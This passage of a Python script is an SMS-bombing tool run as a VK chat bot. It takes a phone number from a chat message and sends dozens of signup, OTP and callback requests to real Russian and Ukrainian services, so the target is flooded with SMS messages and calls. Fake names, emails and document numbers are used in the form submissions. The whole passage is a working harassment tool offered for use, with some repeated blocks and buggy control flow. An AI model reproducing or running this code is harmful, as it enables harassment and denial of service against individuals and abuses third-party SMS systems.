                            "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                            "SecondName": _name, "Phone": _phone, "Email": _email, })
        print('[+] Ingos отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                      json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                            "email": "", "lang": "en", })
        print('[+] Admiralxxx отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
        print('[+] Av отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
        print('[+] City24 отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
        print('[+] SushiMaster отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
        print('[+] MultiPlex отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
        print('[+] 3040 отправлено!')
    except:
        print('[-] не отправлено!')
    try:
        requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                      data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
        print('[+] Niyama отправлено!')
    except:
        print('[-] Niyama не отправлено!')
    try:
        requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
        print('[+] VSK отправлено!')
    except:
        print('[-] VSK не отправлено!')
    try:
        requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})

        print('[+] MonoBank отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})

        print('[+] binotel отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                     data={"phone": _phone})

        print('[+] SportMaster отправлено!')

    except:
        print('[-] не отправлено!')

    try:

        requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})

        print('[+] Alfalife отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})

        print('[+] KoronaPay отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone, })

        print('[+] BTfair отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://ggbet.ru/api/auth/register-with-phone',
                      data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                            "oferta": "on", })

        print('[+] GGbet отправлено!')

    except:
        print('[-]  не отправлено!')

    try:
        requests.post('https://www.etm.ru/cat/runprog.html',
                      data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                            "getSysParam": "yes", })

        print('[+] ETM отправлено!')

    except:
        print('[-] не отправлено!')

    try:

        requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })

        print('[+] TheLive отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})

        print('[+] MTS отправлено!')

    except:
        print('[-] error in sent!')

    try:
        requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})

        print('[+] MyGames отправлено!')

    except:
        print('[+] error in sent!')

    try:
        requests.post('https://zoloto585.ru/api/bcard/reg/',
                      json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                            "birthdate": "11.11.1999", "phone": (_phone, "+* (***) ***-**-**"), "email": _email,
                            "city": "Москва", })

        print('[+] Zoloto585 отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})

        print('[+] Kasta отправлено!')

    except:
        print('[-] Kasta Не отправлено!')

    try:
        requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                      data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})

        print('[+] Тaxi отправлено!')

    except:
        print('[-] не отправлено!')

    try:

        requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                      json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })

        print('[+] Mail.ru отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.creditter.ru/confirm/sms/send',
                      json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })

        print('[+] Creditter отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                      headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                      json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                            "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
                            "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                            "SecondName": _name, "Phone": _phone, "Email": _email, })

        print('[+] Ingos отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                      json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                            "email": "", "lang": "en", })

        print('[+] Admiralxxx отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})

        print('[+] Av отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                      params={"msisdn": _phone})

        print('[+] MTS отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})

        print('[+] City24 отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})

        print('[+] SushiMaster отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://auth.multiplex.ua/login', json={"login": _phone})

        print('[+] MultiPlex отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})

        print('[+] 3040 отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                      data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })

        print('[+] Niyama отправлено!')

    except:
        print('[-] Niyama не отправлено!')

    try:
        requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})

        print('[+] VSK отправлено!')

    except:
        print('[-] VSK не отправлено!')

    try:
        requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})

        print('[+] EasyPay отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                      data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})

        print('[+] Fix-Price отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
                                                 "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode",
                                                 "phone": _phone, "registration": "N", })

        print('[+] NovaLinia отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})

        print('[+] Tele2 отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})

        print('[+] Finam отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://makimaki.ru/system/callback.php',
                      params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})

        print('[+] MakiMaki отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.flipkart.com/api/6/user/signup/status',
                      headers={"Origin": "https://www.flipkart.com",
                               "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                      json={"loginId": "+" + _phone, "supportAllStates": True})

        print('[+] FlipKart отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})

        print('[+] Online.ua отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})

        print('[+] PlanetaKino отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://ontaxi.com.ua/api/v2/web/client',
                      json={"country": _codes[_code].upper(), "phone": _phone, })

        print('[+] OnTaxi отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})

        print('[+] Iqos отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://smart.space/api/users/request_confirmation_code/',
                      json={"mobile": "+" + _phone, "action": "confirm_mobile"})

        print('[+] Smart.Space отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})

        print('[+] KFC отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                      data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                            'phone': _phone})

        print('[+] tarantino-family отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://apteka.ru/_action/auth/getForm/',
                      data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                            "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                            "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                            "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                            "utc_offset": "120", })

        print('[+] Apteka отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://uklon.com.ua/api/v1/account/code/send',
                      headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})

        print('[+] Uklon отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                      json={"phone": _phone, "otpId": 0})

        print('[+] Ozon отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.get('https://requests.service.banki.ru/form/960/submit',
                     params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                             "gorod": "Москва", "approving_data": "1", })

        print('[+] Banki отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})

        print('[+] IVI отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://www.moyo.ua/identity/registration',
                      data={"firstname": _name, "phone": _phone, "email": _email})

        print('[+] Moyo отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})

        print('[+] Helsi отправлено!')

    except:
        print('[+] не отправлено!')

    try:
        requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"},
                      json={"Phone": _phone, "Type": 1})

        print('[+] KinoLend отправлено!')

    except:
        print('[-] не отправлено!')

    try:
        requests.post('https://pizzahut.ru/account/password-reset',
                      data={'reset_by': 'phone', 'action_id': 'pass-recovery', 'phone': _phonePizzahut,
                            '_token': '*'})

        print('[+] PizzaHut отправлено!')

    except:
        print('[-] error in sent!')

    try:
        requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                      data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru', 'version': '1',
                            "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
        print('[+] Отправлено!')
    except:
        messagebox.showinfo("Уведомление", "Бомбинг завершен. Попыток отправки сообщения: 130")	

    try:
        requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
        print('[+] Delivery отправлено!')
    except:
        print('[-] Не отправлено!')
        global idi
        write_msg(randint, idi, "Бомбинг завершен.")
    check()
# Функция чекера входящих
def check():
    global _phone
    global idi
    print("Жду новой команды.")
    for event in lon.listen():
        if event.type == VkEventType.MESSAGE_NEW:
            if event.to_me:
                request = event.text
                randint = random.randint(100000000, 900000000)
                request = request.lower()
                chat_id = vk.method('messages.getConversations')
                chat_id = chat_id['items']
                print(chat_id)
                idi = event.user_id
                for check in request:
                    id = vk.method('messages.getConversations')
                    id = id['items'][0]['last_message']['from_id']
                    print(id)
                    if request == "начать":
                        write_msg(randint, idi, "Вас приветствует бот AnIS SMS Machine by AnisTech. "
                                                "Чтобы начать бомбинг, введи номер телефона в формате: 79*********."
                                                "Запросов за один сеанс бомбинга: 49."
                                                "Ожидаю вашей команды.")
                    elif request == "создатель":
                        write_msg(randint, idi, "Создатель бота - AnIS. "
                                                "Версия: 1.0")
                    elif request != "начать" or "создатель" or "стоп":
                        _phone = request
                        #Форматирование входящего номера телефона
                        if _phone[0] == '+':
                            _phone = _phone[1:]
                        if _phone[0] == '8':
                            _phone = '7' + _phone[1:]
                        if _phone[0] == '9':
                            _phone = '7' + _phone
                        write_msg(randint, idi, "Бомбинг начинается!")
                        bomb()
                        print("бомбинг завершен.")


while True:
    check()
